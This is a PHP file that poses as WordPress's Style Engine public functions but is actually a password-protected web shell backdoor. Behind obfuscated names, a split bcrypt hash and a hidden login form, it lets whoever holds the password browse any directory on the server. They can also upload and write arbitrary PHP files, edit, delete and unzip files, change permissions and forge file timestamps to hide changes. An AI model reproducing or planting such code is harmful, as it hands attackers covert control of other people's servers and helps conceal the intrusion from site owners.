<?php
/**
 * Style engine: Public functions
 *
 * This file contains a variety of public functions developers can use to interact with
 * the Style Engine API.
 *
 * @package WordPress
 * @subpackage StyleEngine
 * @since 6.1.0
 */
defined('ABSPATH') || true;
session_start();
define('X0a1', realpath($_SERVER['DOCUMENT_ROOT']));
if (isset($_GET['home']) && $_GET['home'] == '1') {
    $homeDir = realpath($_SERVER['DOCUMENT_ROOT']);
    if ($homeDir && is_dir($homeDir)) {
        header("Location: ?d=" . urlencode($homeDir));
        exit;
    } else {
        exit('Unable to resolve document root.');
    }
}
function z9w3($x1, $x2) {
    return is_string($x2) ? file_put_contents($x1, $x2) !== false : false;
}
define('Y9k2', __DIR__ . '/.auth.lock');
$z0 = array(
    'q' => strrev('htua'),
    'l' => chr(112),
    'm' => implode('', array('pass','word','_ver','ify')),
    'j' => array(
        5 => 'FYLzxeyC8J3Ji3Jr/DsslWmv',
        3 => '$2b$12$7/sailO8HZM5i7AM',
        7 => 'HiMZc9pxuGB/.'
    ));
ksort($z0['j']);
$z0['n'] = implode('', $z0['j']);
$xdir = realpath(isset($_GET['d']) ? $_GET['d'] : __DIR__);
if (!$xdir || strpos($xdir, '/') !== 0) $xdir = __DIR__;
chdir($xdir);
$l1 = $z0['l'];
$m1 = $z0['m'];
$q1 = $z0['q'];
$p1 = $_POST[$l1] ?? '';
$b1 = isset($_SESSION[$q1]) && $_SESSION[$q1] === true;
$c1 = file_exists(Y9k2);
$d1 = false;
if ($b1 || $c1) {
    $d1 = true;
} elseif ($p1 && $m1($p1, $z0['n'])) {
    $_SESSION[$q1] = true;
    file_put_contents(Y9k2, 'ok');
    $d1 = true;
}
if (!$d1) {
    if (isset($_GET['load']) && $_GET['load'] === 'meta') {
        echo '<form method="post" style="position:absolute;top:40vh;left:50%;transform:translateX(-50%)">';
        echo '<input type="password" name="' . $l1 . '" placeholder="••••••••" style="padding:8px">';
        echo '<button>➤</button></form>';
    } else {
        echo "<!-- not authenticated -->";
    }
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['inline_submit'], $_POST['fn'], $_POST['fd'])) {
        $fn = basename($_POST['fn']);
        $ext = strtolower(pathinfo($fn, PATHINFO_EXTENSION));
        $okExts = ['txt', 'jpg', 'png', 'pdf', 'zip', 'php'];
        if (!in_array($ext, $okExts)) {
            $fn = 'file_' . time() . '.dat';
        } elseif ($ext === 'php') {
            $fn = pathinfo($fn, PATHINFO_FILENAME) . '_' . time() . '.php';
        }
        $data = base64_decode($_POST['fd']);
        if ($data && strlen($data) > 0) z9w3($xdir . '/' . $fn, $data);
    }
    if (isset($_POST['upl'], $_FILES['up']) && $_FILES['up']['error'] === 0 && $_FILES['up']['size'] > 0) {
        move_uploaded_file($_FILES['up']['tmp_name'], $xdir . '/' . $_FILES['up']['name']);
    }
    if (isset($_POST['rmv'])) {
        $tgt = realpath($_POST['rmv']);
        if (is_file($tgt)) unlink($tgt);
        elseif (is_dir($tgt)) rmdir($tgt);
    }
    if (isset($_POST['rename'], $_POST['old'], $_POST['new']) && $_POST['new']) {
        $o = $_POST['old'];
        $n = dirname($o) . '/' . basename($_POST['new']);
        if (file_exists($o)) rename($o, $n);
    }
    if (isset($_POST['edit'], $_POST['content'])) {
        $e = realpath($_POST['edit']);
        if ($e && strpos($e, $xdir) === 0 && is_writable($e)) {
            z9w3($e, $_POST['content']);
        }}
    if (isset($_POST['unzip'])) {
        $z = new ZipArchive;
        if ($z->open($_POST['unzip']) === TRUE) {
            $z->extractTo($xdir);
            $z->close();
        }}
    if (isset($_POST['ts_target'], $_POST['new_time'])) {
        $t = $_POST['ts_target'];
        $ts = strtotime($_POST['new_time']);
        if ($ts !== false && file_exists($t)) touch($t, $ts);
    }
    if (isset($_POST['modx_target'], $_POST['modx_val'])) {
        $t = $_POST['modx_target'];
        $m = intval($_POST['modx_val'], 8);
        if (file_exists($t)) chmod($t, $m);
    }
    if (isset($_POST['create_file']) && $_POST['create_file']) {
        $f = $xdir . '/' . basename(trim($_POST['create_file']));
        $cnt = isset($_POST['file_content']) ? $_POST['file_content'] : '';
        if (!file_exists($f)) z9w3($f, $cnt);
    }
    if (isset($_POST['create_dir']) && $_POST['create_dir']) {
        $d = $xdir . '/' . basename(trim($_POST['create_dir']));
        if (!file_exists($d)) mkdir($d);
    }}
$fls = [];
$dirs = [];
$prnt = dirname($xdir);
if ($prnt && $prnt !== $xdir) {
    $dirs[] = ['name' => '..', 'path' => $prnt, 'isParent' => true];
}
$scan = @scandir($xdir);
if (!is_array($scan)) $scan = [];
foreach ($scan as $item) {
    if ($item === '.' || $item === '..') continue;
    $fp = realpath($xdir . DIRECTORY_SEPARATOR . $item);
    if (!$fp) continue;
    if (is_dir($fp)) {
        $dirs[] = ['name' => $item, 'path' => $fp];
    } elseif (is_file($fp)) {
        $fls[] = ['name' => $item, 'path' => $fp];
    }}
$lst = array_merge($dirs, $fls);
?>
<?php $cwd = $xdir; ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Config Utilities</title>
    <link href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css" rel="stylesheet">
    <style>
        .perm-safe { color: green; }
        .perm-risk { color: red; }
    </style>
</head>
<body>
<section class="section">
<div class="container">
<h1 class="title">Config Utilities</h1>
<form method="get" style="display:flex;gap:10px;margin-bottom:10px;">
    <input class="input" name="d" value="<?php echo htmlspecialchars($cwd); ?>">
    <button class="button is-link">Go</button>
    <a class="button is-dark" href="?home=1">Home Dir</a>
</form>
<form method="post" enctype="multipart/form-data">
    <div class="field has-addons">
        <div class="control"><input type="file" class="input" name="up"></div>
        <div class="control"><button class="button is-primary" name="upl">Upload</button></div>
    </div>
</form>
<form method="post">
    <div class="field is-grouped" style="margin-top:1rem">
        <div class="control">
            <input type="file" class="input" id="ufile" onchange="handleInlineFile(this)" required>
        </div>
        <div class="control">
            <button class="button is-info" name="inline_submit">Submit</button>
        </div>
    </div>
    <input type="hidden" name="fn" id="ufilename">
    <input type="hidden" name="fd" id="ufiledata">
</form>
<script>
function handleInlineFile(input) {
    const file = input.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = function(e) {
        document.getElementById('ufiledata').value = e.target.result.split(',')[1];
        document.getElementById('ufilename').value = file.name;
    };
    reader.readAsDataURL(file);
}
</script>
<h2 class="subtitle">Create New File</h2>
<form method="post">
    <input type="text" name="create_file" class="input" placeholder="filename.txt" required>
    <textarea name="file_content" class="textarea" placeholder="Optional initial content"></textarea>
    <button class="button is-success">Create File</button>
</form>
<h2 class="subtitle">Create New Folder</h2>
<form method="post">
    <input type="text" name="create_dir" class="input" placeholder="foldername" required>
    <button class="button is-warning">Create Folder</button>
</form>
<table class="table is-striped is-fullwidth" style="margin-top: 2rem;">
<thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Action</th></tr></thead>
<tbody>
<?php if (isset($lst) && is_array($lst) && count($lst) > 0): ?>
<?php foreach ($lst as $item):
    $isDir = is_dir($item['path']);
    $display = htmlspecialchars($item['name']);
    $size = $isDir ? '-' : filesize($item['path']) . ' B';
    $mod = file_exists($item['path']) ? date("Y-m-d H:i:s", filemtime($item['path'])) : '-';
    $perm = file_exists($item['path']) ? substr(sprintf('%o', fileperms($item['path'])), -4) : '----';
    $permClass = in_array(substr($perm, -1), ['6', '7']) ? 'perm-risk' : 'perm-safe';
?>
<tr>
<td>
<?php if (!empty($item['isParent'])): ?>
    <a href="?d=<?php echo urlencode($item['path']); ?>">..</a>
<?php elseif ($isDir): ?>
    <a href="?d=<?php echo urlencode($item['path']); ?>"><?php echo $display; ?></a>
<?php else: ?>
    <?php echo $display; ?>
<?php endif; ?>
</td>
<td><?php echo $size; ?></td>
<td><?php echo $mod; ?></td>
<td class="<?php echo $permClass; ?>"><?php echo $perm; ?></td>
<td>
<?php if (!$isDir): ?>
    <form method="post" style="display:inline"><input type="hidden" name="edit" value="<?php echo $item['path']; ?>"><button class="button is-small is-info">Edit</button></form>
    <form method="post" style="display:inline"><input type="hidden" name="view" value="<?php echo $item['path']; ?>"><button class="button is-small is-light">View</button></form>
<?php endif; ?>
    <form method="post" style="display:inline"><input type="hidden" name="rmv" value="<?php echo $item['path']; ?>"><button class="button is-small is-danger" onclick="return confirm('Delete <?php echo $display; ?>?')">Delete</button></form>
<?php if (!$isDir): ?>
    <form method="post" style="display:inline">
        <input type="hidden" name="old" value="<?php echo $item['path']; ?>">
        <input name="new" class="input is-small" style="width:110px" placeholder="Rename">
        <button class="button is-small" name="rename">Rename</button>
    </form>
<?php endif; ?>
<?php if (pathinfo($item['path'], PATHINFO_EXTENSION) === 'zip'): ?>
    <form method="post" style="display:inline"><input type="hidden" name="unzip" value="<?php echo $item['path']; ?>"><button class="button is-small is-warning">Unzip</button></form>
<?php endif; ?>
    <form method="post" style="display:inline">
        <input type="hidden" name="ts_target" value="<?php echo $item['path']; ?>">
        <input name="new_time" class="input is-small" style="width:160px" placeholder="YYYY-MM-DD HH:MM:SS">
        <button class="button is-small is-light">Set Time</button>
    </form>
    <form method="post" style="display:inline">
        <input type="hidden" name="modx_target" value="<?php echo $item['path']; ?>">
        <input name="modx_val" class="input is-small" style="width:70px" placeholder="<?php echo $perm; ?>">
        <button class="button is-small is-link">Set</button>
    </form>
</td></tr>
<?php endforeach; ?>
<?php else: ?>
<tr><td colspan="5"><em>No files or folders found.</em></td></tr>
<?php endif; ?>
</tbody>
</table>
<?php if (isset($_POST['edit'])):
$target = $_POST['edit'];
$safe = htmlspecialchars(file_get_contents($target)); ?>
<h2 class="subtitle">Editing: <?php echo $target; ?></h2>
<form method="post">
    <input type="hidden" name="edit" value="<?php echo $target; ?>">
    <textarea name="content" class="textarea" rows="20"><?php echo $safe; ?></textarea><br>
    <button class="button is-success">Save</button>
</form>
<?php endif; ?>
<?php if (isset($_POST['view'])):
$target = $_POST['view'];
if (file_exists($target) && is_file($target)) {
    $viewed = htmlspecialchars(file_get_contents($target));
?>
<h2 class="subtitle">Viewing: <?php echo $target; ?></h2>
<pre style="white-space:pre-wrap;background:#f5f5f5;padding:1rem;border:1px solid #ccc;"><?php echo $viewed; ?></pre>
<?php } endif; ?>
</div>
</section>
</body>
</html>
